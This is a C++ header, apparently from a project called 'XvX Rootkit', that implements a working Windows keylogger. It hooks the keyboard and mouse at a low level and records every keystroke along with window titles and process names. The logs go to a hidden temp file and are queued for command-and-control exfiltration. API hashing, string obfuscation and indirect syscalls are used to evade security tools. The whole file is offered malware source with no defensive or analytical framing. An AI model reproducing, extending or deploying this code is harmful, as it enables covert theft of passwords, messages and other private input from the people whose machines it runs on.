// XvX Rootkit - Keylogger (low-level keyboard hook with C2 exfiltration)
// Copyright (c) 2025 - 28zaakypro@proton.me

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <string>
#include <sstream>
#include <fstream>
#include <iostream>
#include <map>
#include <queue>
#include <chrono>
#include <iomanip>
#include "APIHashing.h"
#include "StringObfuscation.h"
#include "IndirectSyscalls.h"

class Keylogger
{
private:
    static HHOOK         g_hKeyHook;
    static HHOOK         g_hMouseHook;
    static std::wstring  g_keyBuffer;        // inter-keypress accumulator
    static bool          g_isActive;
    static HANDLE        g_hMutex;
    static void        (*g_callback)(const std::wstring &);
    static std::wstring  g_logFilePath;
    static std::wstring  g_currentWindow;
    static bool          g_logToFile;

    // Async exfil — hook callbacks only push here, never do I/O directly
    static std::queue<std::wstring> g_exfilQueue;
    static HANDLE                   g_hExfilEvent;   // auto-reset: signals pending data
    static HANDLE                   g_hExfilThread;

    // ── Key name resolution ───────────────────────────────────────────────────

    static std::wstring getKeyName(DWORD vkCode, bool shift)
    {
        // Modifier keys are filtered before this call — no entries needed for them
        static std::map<DWORD, std::wstring> specialKeys = {
            {VK_RETURN,   L"[ENTER]\n"},
            {VK_SPACE,    L" "},
            {VK_TAB,      L"[TAB]"},
            {VK_ESCAPE,   L"[ESC]"},
            {VK_PRIOR,    L"[PGUP]"},
            {VK_NEXT,     L"[PGDN]"},
            {VK_END,      L"[END]"},
            {VK_HOME,     L"[HOME]"},
            {VK_LEFT,     L"[LEFT]"},
            {VK_UP,       L"[UP]"},
            {VK_RIGHT,    L"[RIGHT]"},
            {VK_DOWN,     L"[DOWN]"},
            {VK_SNAPSHOT, L"[PRTSC]"},
            {VK_INSERT,   L"[INS]"},
            {VK_DELETE,   L"[DEL]"},
            {VK_LWIN,     L"[WIN]"},
            {VK_RWIN,     L"[WIN]"},
            {VK_F1,  L"[F1]"},  {VK_F2,  L"[F2]"},  {VK_F3,  L"[F3]"},
            {VK_F4,  L"[F4]"},  {VK_F5,  L"[F5]"},  {VK_F6,  L"[F6]"},
            {VK_F7,  L"[F7]"},  {VK_F8,  L"[F8]"},  {VK_F9,  L"[F9]"},
            {VK_F10, L"[F10]"}, {VK_F11, L"[F11]"}, {VK_F12, L"[F12]"}
        };

        auto it = specialKeys.find(vkCode);
        if (it != specialKeys.end()) return it->second;

        if (vkCode >= 0x30 && vkCode <= 0x5A)
        {
            wchar_t ch = (wchar_t)vkCode;
            if (shift && vkCode >= 0x30 && vkCode <= 0x39) {
                static std::wstring shiftNumbers = L")!@#$%^&*(";
                return std::wstring(1, shiftNumbers[vkCode - 0x30]);
            }
            if (!shift && vkCode >= 0x41 && vkCode <= 0x5A) ch = towlower(ch);
            return std::wstring(1, ch);
        }

        if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
            return std::wstring(1, L'0' + (vkCode - VK_NUMPAD0));

        static std::map<DWORD, std::pair<std::wstring, std::wstring>> charKeys = {
            {VK_OEM_1,      {L";",  L":"}},
            {VK_OEM_PLUS,   {L"=",  L"+"}},
            {VK_OEM_COMMA,  {L",",  L"<"}},
            {VK_OEM_MINUS,  {L"-",  L"_"}},
            {VK_OEM_PERIOD, {L".",  L">"}},
            {VK_OEM_2,      {L"/",  L"?"}},
            {VK_OEM_3,      {L"`",  L"~"}},
            {VK_OEM_4,      {L"[",  L"{"}},
            {VK_OEM_5,      {L"\\", L"|"}},
            {VK_OEM_6,      {L"]",  L"}"}},
            {VK_OEM_7,      {L"'",  L"\""}}
        };

        auto charIt = charKeys.find(vkCode);
        if (charIt != charKeys.end())
            return shift ? charIt->second.second : charIt->second.first;

        return L"";
    }

    // ── Window title + process name via APIResolver ───────────────────────────

    static std::wstring GetActiveWindowTitle(HWND hwnd = NULL)
    {
        if (hwnd == NULL) {
            auto fn = RESOLVE_API(GetForegroundWindow);
            hwnd = fn ? fn() : NULL;
        }
        if (hwnd == NULL) return L"[Unknown Window]";

        wchar_t windowTitle[256] = {0};
        {
            auto fn = RESOLVE_API(GetWindowTextW);
            if (fn) fn(hwnd, windowTitle, 256);
            else    GetWindowTextW(hwnd, windowTitle, 256);
        }

        DWORD processId = 0;
        {
            auto fn = RESOLVE_API(GetWindowThreadProcessId);
            if (fn) fn(hwnd, &processId);
            else    GetWindowThreadProcessId(hwnd, &processId);
        }

        struct { PVOID UniqueProcess; PVOID UniqueThread; } clientId;
        clientId.UniqueProcess = (PVOID)(ULONG_PTR)processId;
        clientId.UniqueThread  = NULL;

        struct {
            ULONG  Length; HANDLE RootDirectory; PVOID ObjectName;
            ULONG  Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService;
        } objAttr = {0};
        objAttr.Length = sizeof(objAttr);

        HANDLE hProcess = NULL;
        IndirectSyscalls::SysNtOpenProcess(
            &hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);

        if (hProcess != NULL)
        {
            wchar_t processName[MAX_PATH];
            DWORD   size = MAX_PATH;
            auto fn = RESOLVE_API(QueryFullProcessImageNameW);
            bool ok = fn ? (fn(hProcess, 0, processName, &size) != 0)
                         : (QueryFullProcessImageNameW(hProcess, 0, processName, &size) != 0);
            if (ok)
            {
                std::wstring fullPath(processName);
                size_t pos = fullPath.find_last_of(L"\\/");
                if (pos != std::wstring::npos) fullPath = fullPath.substr(pos + 1);
                IndirectSyscalls::SysNtClose(hProcess);
                return std::wstring(windowTitle) + L" [" + fullPath + L"]";
            }
            IndirectSyscalls::SysNtClose(hProcess);
        }

        return std::wstring(windowTitle);
    }

    // ── Local file logging ────────────────────────────────────────────────────

    static void WriteToFile(const std::wstring &data)
    {
        if (!g_logToFile || g_logFilePath.empty()) return;

        int pathSize = WideCharToMultiByte(CP_UTF8, 0, g_logFilePath.c_str(), -1, NULL, 0, NULL, NULL);
        if (pathSize <= 0) return;

        char *pathBuffer = new (std::nothrow) char[pathSize];
        if (!pathBuffer) return;
        WideCharToMultiByte(CP_UTF8, 0, g_logFilePath.c_str(), -1, pathBuffer, pathSize, NULL, NULL);

        std::ofstream logFile;
        logFile.open(pathBuffer, std::ios::app | std::ios::binary);
        delete[] pathBuffer;

        if (logFile.is_open())
        {
            int size = WideCharToMultiByte(CP_UTF8, 0, data.c_str(), -1, NULL, 0, NULL, NULL);
            if (size > 0)
            {
                char *buf = new (std::nothrow) char[size];
                if (buf) {
                    WideCharToMultiByte(CP_UTF8, 0, data.c_str(), -1, buf, size, NULL, NULL);
                    logFile.write(buf, size - 1);
                    delete[] buf;
                }
            }
            logFile.close();
        }
    }

    // ── Async exfil queue ─────────────────────────────────────────────────────

    // Push completed buffer to exfil queue and wake sender thread.
    // Fast — only touches mutex + event, no I/O. Safe to call from hook callbacks.
    static void PushExfil(const std::wstring &data)
    {
        WaitForSingleObject(g_hMutex, INFINITE);
        g_exfilQueue.push(data);
        ReleaseMutex(g_hMutex);
        SetEvent(g_hExfilEvent);
    }

    // Drain all queued buffers: send via callback + write to file.
    // Runs in ExfilThread only — all blocking I/O stays off the hook thread.
    static void DrainExfilQueue()
    {
        while (true) {
            WaitForSingleObject(g_hMutex, INFINITE);
            if (g_exfilQueue.empty()) { ReleaseMutex(g_hMutex); return; }
            std::wstring data = g_exfilQueue.front();
            g_exfilQueue.pop();
            ReleaseMutex(g_hMutex);

            if (g_callback) {
                try { g_callback(data); } catch (...) {}
            }
            WriteToFile(data);
        }
    }

    // Background sender thread: all network + file I/O is done here,
    // never in hook callbacks (which time out at ~300 ms).
    static DWORD WINAPI ExfilThread(LPVOID)
    {
        while (g_isActive) {
            WaitForSingleObject(g_hExfilEvent, 1000);
            DrainExfilQueue();
        }
        DrainExfilQueue(); // final drain after stop
        return 0;
    }

    // ── Hook callbacks ────────────────────────────────────────────────────────

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
        {
            KBDLLHOOKSTRUCT *pKb = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = pKb->vkCode;

            // Discard standalone modifiers early — no further work needed
            if (vkCode == VK_SHIFT   || vkCode == VK_LSHIFT   || vkCode == VK_RSHIFT   ||
                vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL  ||
                vkCode == VK_MENU    || vkCode == VK_LMENU    || vkCode == VK_RMENU     ||
                vkCode == VK_CAPITAL)
            {
                auto fn = RESOLVE_API(CallNextHookEx);
                if (fn) return fn(g_hKeyHook, nCode, wParam, lParam);
                return 0;
            }

            BYTE keyboardState[256];
            if (!GetKeyboardState(keyboardState)) {
                auto fn = RESOLVE_API(CallNextHookEx);
                if (fn) return fn(g_hKeyHook, nCode, wParam, lParam);
                return 0;
            }

            auto fnGetFg = RESOLVE_API(GetForegroundWindow);
            HWND hwnd = fnGetFg ? fnGetFg() : NULL;

            auto fnGetTid = RESOLVE_API(GetWindowThreadProcessId);
            DWORD threadId = fnGetTid ? fnGetTid(hwnd, NULL) : 0;
            HKL keyboardLayout = GetKeyboardLayout(threadId);

            wchar_t unicodeBuffer[5] = {0};
            int result = ToUnicodeEx(vkCode, pKb->scanCode, keyboardState,
                                     unicodeBuffer, 4, 0, keyboardLayout);

            std::wstring keyName;
            if (result > 0)
                keyName = std::wstring(unicodeBuffer, result);
            else
            {
                auto fnGAKS = RESOLVE_API(GetAsyncKeyState);
                bool shiftPressed = fnGAKS ? (fnGAKS(VK_SHIFT) & 0x8000) != 0 : false;
                keyName = getKeyName(vkCode, shiftPressed);
            }

            if (vkCode == VK_BACK)
            {
                WaitForSingleObject(g_hMutex, INFINITE);
                if (!g_keyBuffer.empty())
                {
                    size_t lastNl  = g_keyBuffer.find_last_of(L'\n');
                    size_t lastRBr = g_keyBuffer.find_last_of(L']');
                    if (lastRBr != std::wstring::npos &&
                        (lastNl == std::wstring::npos || lastRBr > lastNl))
                    {
                        size_t openBr = g_keyBuffer.find_last_of(L'[');
                        if (openBr != std::wstring::npos) g_keyBuffer.erase(openBr);
                    }
                    else { g_keyBuffer.pop_back(); }
                }
                ReleaseMutex(g_hMutex);
                auto fn = RESOLVE_API(CallNextHookEx);
                if (fn) return fn(g_hKeyHook, nCode, wParam, lParam);
                return 0;
            }

            if (!keyName.empty())
            {
                // Resolve window title BEFORE mutex — avoids holding lock during
                // slow NtOpenProcess/QueryFullProcessImageNameW chain
                std::wstring activeWindow = GetActiveWindowTitle(hwnd);

                WaitForSingleObject(g_hMutex, INFINITE);

                if (activeWindow != g_currentWindow)
                {
                    g_currentWindow = activeWindow;
                    auto now = std::chrono::system_clock::now();
                    auto t   = std::chrono::system_clock::to_time_t(now);
                    tm ltime; localtime_s(&ltime, &t);
                    std::wstringstream ts;
                    ts << L"\n\n[" << std::put_time(&ltime, L"%Y-%m-%d %H:%M:%S")
                       << L"] Window: " << g_currentWindow << L"\n";
                    g_keyBuffer += ts.str();
                }

                if (vkCode == VK_RETURN)
                {
                    g_keyBuffer += L"[ENTER]\n";
                    std::wstring bufferCopy = g_keyBuffer;
                    g_keyBuffer.clear();
                    ReleaseMutex(g_hMutex);
                    PushExfil(bufferCopy); // queue for background thread — no I/O here
                }
                else
                {
                    g_keyBuffer += keyName;
                    ReleaseMutex(g_hMutex);
                }
            }
        }

        auto fn = RESOLVE_API(CallNextHookEx);
        if (fn) return fn(g_hKeyHook, nCode, wParam, lParam);
        return 0;
    }

    static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode == HC_ACTION && wParam == WM_RBUTTONDOWN)
        {
            WaitForSingleObject(g_hMutex, INFINITE);
            std::wstring bufferCopy = g_keyBuffer;
            g_keyBuffer.clear();
            ReleaseMutex(g_hMutex);

            if (!bufferCopy.empty())
                PushExfil(bufferCopy); // queue — no I/O in mouse hook
        }

        auto fn = RESOLVE_API(CallNextHookEx);
        if (fn) return fn(g_hMouseHook, nCode, wParam, lParam);
        return 0;
    }

public:
    // ── Lifecycle ─────────────────────────────────────────────────────────────

    static bool Start(void (*callback)(const std::wstring &) = nullptr,
                      bool logToFile = true,
                      const std::wstring &logPath = L"")
    {
        if (g_isActive) return false;

        g_callback  = callback;
        g_keyBuffer.clear();
        g_logToFile = logToFile;

        if (logPath.empty())
        {
            wchar_t tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            LARGE_INTEGER perf;
            QueryPerformanceCounter(&perf);
            DWORD seed = (DWORD)(perf.LowPart ^ perf.HighPart)
                         ^ GetCurrentProcessId()
                         ^ (DWORD)(ULONG_PTR)&g_keyBuffer;
            wchar_t rname[16];
            swprintf_s(rname, L"%08x.tmp", seed);
            g_logFilePath = std::wstring(tempPath) + rname;
        }
        else { g_logFilePath = logPath; }

        if (g_logToFile)
        {
            auto now = std::chrono::system_clock::now();
            auto t   = std::chrono::system_clock::to_time_t(now);
            tm ltime; localtime_s(&ltime, &t);
            std::wstringstream hdr;
            hdr << L"========================================\n"
                << OBFUSCATE_W(L"Session Started") << L"\n"
                << L"Date: " << std::put_time(&ltime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                << L"========================================\n";
            WriteToFile(hdr.str());
        }

        g_hMutex = CreateMutexW(NULL, FALSE, NULL);
        if (!g_hMutex) return false;

        auto fnHook   = RESOLVE_API(SetWindowsHookExW);
        auto fnUnhook = RESOLVE_API(UnhookWindowsHookEx);
        if (!fnHook) { CloseHandle(g_hMutex); g_hMutex = NULL; return false; }

        g_hKeyHook = fnHook(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
        if (!g_hKeyHook) {
            CloseHandle(g_hMutex); g_hMutex = NULL;
            return false;
        }

        g_hMouseHook = fnHook(WH_MOUSE_LL, MouseProc, NULL, 0);
        if (!g_hMouseHook) {
            if (fnUnhook) fnUnhook(g_hKeyHook);
            g_hKeyHook = NULL;
            CloseHandle(g_hMutex); g_hMutex = NULL;
            return false;
        }

        g_hExfilEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
        if (!g_hExfilEvent) {
            if (fnUnhook) { fnUnhook(g_hKeyHook); fnUnhook(g_hMouseHook); }
            g_hKeyHook = g_hMouseHook = NULL;
            CloseHandle(g_hMutex); g_hMutex = NULL;
            return false;
        }

        g_isActive = true;
        g_currentWindow.clear();

        g_hExfilThread = CreateThread(NULL, 0, ExfilThread, NULL, 0, NULL);
        if (!g_hExfilThread) {
            g_isActive = false;
            if (fnUnhook) { fnUnhook(g_hKeyHook); fnUnhook(g_hMouseHook); }
            g_hKeyHook = g_hMouseHook = NULL;
            CloseHandle(g_hExfilEvent); g_hExfilEvent = NULL;
            CloseHandle(g_hMutex); g_hMutex = NULL;
            return false;
        }

        return true;
    }

    static void Stop()
    {
        if (!g_isActive) return;

        // Remove hooks first — no new callbacks can fire after this
        auto fnUnhook = RESOLVE_API(UnhookWindowsHookEx);
        if (g_hKeyHook)   { if (fnUnhook) fnUnhook(g_hKeyHook);   g_hKeyHook   = NULL; }
        if (g_hMouseHook) { if (fnUnhook) fnUnhook(g_hMouseHook); g_hMouseHook = NULL; }

        // Flush remaining accumulator to exfil queue, then signal stop
        WaitForSingleObject(g_hMutex, INFINITE);
        std::wstring bufferCopy = g_keyBuffer;
        g_keyBuffer.clear();
        if (!bufferCopy.empty()) g_exfilQueue.push(bufferCopy); // push under mutex
        g_isActive = false;                                       // signal thread to exit
        ReleaseMutex(g_hMutex);

        // Wake exfil thread so it drains queue and exits (don't wait up to 1s)
        if (g_hExfilEvent) SetEvent(g_hExfilEvent);

        // Wait for full drain — up to 60s (10s-timeout HTTP × up to 4 retries + slack)
        if (g_hExfilThread) {
            WaitForSingleObject(g_hExfilThread, 60000);
            CloseHandle(g_hExfilThread); g_hExfilThread = NULL;
        }
        if (g_hExfilEvent) { CloseHandle(g_hExfilEvent); g_hExfilEvent = NULL; }

        // Thread is gone — safe to write footer and close mutex
        if (g_logToFile)
        {
            auto now = std::chrono::system_clock::now();
            auto t   = std::chrono::system_clock::to_time_t(now);
            tm ltime; localtime_s(&ltime, &t);
            std::wstringstream ftr;
            ftr << L"\n========================================\n"
                << OBFUSCATE_W(L"Session Ended") << L"\n"
                << L"Date: " << std::put_time(&ltime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                << L"========================================\n\n";
            WriteToFile(ftr.str());
        }

        if (g_hMutex) { CloseHandle(g_hMutex); g_hMutex = NULL; }
    }

    // ── Public API ────────────────────────────────────────────────────────────

    // Drain accumulator buffer (for !flush C2 command — runs in poll thread, not hook)
    static std::wstring GetBuffer()
    {
        if (!g_hMutex) return L"";
        WaitForSingleObject(g_hMutex, INFINITE);
        std::wstring buf = g_keyBuffer;
        g_keyBuffer.clear();
        ReleaseMutex(g_hMutex);
        return buf;
    }

    // Atomically drain g_keyBuffer + g_exfilQueue into one wstring.
    // Called from keylogger_get() so the poll thread gets everything
    // regardless of ExfilThread timing.
    static std::wstring FlushAll()
    {
        if (!g_hMutex) return L"";
        WaitForSingleObject(g_hMutex, INFINITE);
        std::wstring result = g_keyBuffer;
        g_keyBuffer.clear();
        while (!g_exfilQueue.empty()) {
            result += g_exfilQueue.front();
            g_exfilQueue.pop();
        }
        ReleaseMutex(g_hMutex);
        return result;
    }

    static bool IsActive() { return g_isActive; }

    static std::wstring GetLogFilePath()
    {
        if (!g_hMutex) return g_logFilePath;
        WaitForSingleObject(g_hMutex, INFINITE);
        std::wstring path = g_logFilePath;
        ReleaseMutex(g_hMutex);
        return path;
    }

    static void SetLogFilePath(const std::wstring &path)
    {
        if (!g_hMutex) { g_logFilePath = path; return; }
        WaitForSingleObject(g_hMutex, INFINITE);
        g_logFilePath = path;
        ReleaseMutex(g_hMutex);
    }

    static void EnableFileLogging(bool enable)
    {
        if (!g_hMutex) { g_logToFile = enable; return; }
        WaitForSingleObject(g_hMutex, INFINITE);
        g_logToFile = enable;
        ReleaseMutex(g_hMutex);
    }
};

// Static member initialization
HHOOK                    Keylogger::g_hKeyHook    = NULL;
HHOOK                    Keylogger::g_hMouseHook  = NULL;
std::wstring             Keylogger::g_keyBuffer;
bool                     Keylogger::g_isActive    = false;
HANDLE                   Keylogger::g_hMutex      = NULL;
void                   (*Keylogger::g_callback)(const std::wstring &) = nullptr;
std::wstring             Keylogger::g_logFilePath;
std::wstring             Keylogger::g_currentWindow;
bool                     Keylogger::g_logToFile   = true;
std::queue<std::wstring> Keylogger::g_exfilQueue;
HANDLE                   Keylogger::g_hExfilEvent  = NULL;
HANDLE                   Keylogger::g_hExfilThread = NULL;

#endif // KEYLOGGER_H
